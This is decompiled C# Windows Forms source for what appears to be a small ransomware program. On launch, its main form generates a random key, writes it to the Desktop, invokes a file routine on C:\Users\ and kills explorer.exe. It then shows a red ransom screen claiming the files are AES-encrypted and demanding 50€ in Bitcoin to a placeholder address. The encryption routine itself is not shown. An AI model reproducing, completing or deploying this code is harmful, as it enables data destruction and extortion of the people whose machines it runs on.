using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Tree.My;

namespace Tree;

[DesignerGenerated]
public class Form1 : Form
{
	public static string str;

	private IContainer components;

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual LinkLabel LinkLabel1
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel1_LinkClicked);
			LinkLabel linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	static Form1()
	{
		string Length = Conversions.ToString(12);
		str = getdiskFiles.RandomString(ref Length);
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)str, (MsgBoxStyle)0, (object)null);
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\key.txt", str, true);
		getdiskFiles.getFiles("C:\\Users\\");
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName.ToLower(), "explorer", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.enc).Show();
	}

	private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://de.wikipedia.org/wiki/Advanced_Encryption_Standard");
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Expected O, but got Unknown
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0235: Expected O, but got Unknown
		//IL_02ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c4: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		//IL_03cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d7: Expected O, but got Unknown
		Button1 = new Button();
		Label1 = new Label();
		Label2 = new Label();
		LinkLabel1 = new LinkLabel();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		Button2 = new Button();
		((Control)this).SuspendLayout();
		((ButtonBase)Button1).set_BackColor(Color.Black);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_ForeColor(SystemColors.HotTrack);
		((Control)Button1).set_Location(new Point(16, 212));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(163, 53));
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Enter Key");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Consolas", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.Gold);
		((Control)Label1).set_Location(new Point(12, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(574, 48));
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Do NOT close this Window! (otherwise your Files\r\nare gone for ever and cant be recovered!)\r\n");
		Label1.set_TextAlign((ContentAlignment)2);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(13, 73));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(255, 18));
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Your files has been encrypted with the");
		((Label)LinkLabel1).set_AutoSize(true);
		((Control)LinkLabel1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LinkLabel1).set_Location(new Point(276, 73));
		((Control)LinkLabel1).set_Name("LinkLabel1");
		((Control)LinkLabel1).set_Size(new Size(310, 20));
		((Control)LinkLabel1).set_TabIndex(5);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("Advanced Encryption Standard (AES)");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_Location(new Point(13, 93));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(565, 18));
		((Control)Label3).set_TabIndex(6);
		Label3.set_Text("and can't be decrypted without a specific key (in this case a random generated String)");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.Lime);
		((Control)Label4).set_Location(new Point(13, 137));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(139, 18));
		((Control)Label4).set_TabIndex(7);
		Label4.set_Text("How to get the key?");
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Lime);
		((Control)Label5).set_Location(new Point(13, 155));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(522, 36));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text("Its easier than it seams! Just pay a small fee of 50€ in BTC to {paymentadress}\r\nand you will get your decryption key");
		((ButtonBase)Button2).set_BackColor(Color.Black);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_ForeColor(SystemColors.HotTrack);
		((Control)Button2).set_Location(new Point(415, 212));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(163, 53));
		((Control)Button2).set_TabIndex(9);
		((ButtonBase)Button2).set_Text("End it!");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(600, 277));
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Whoopsie");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
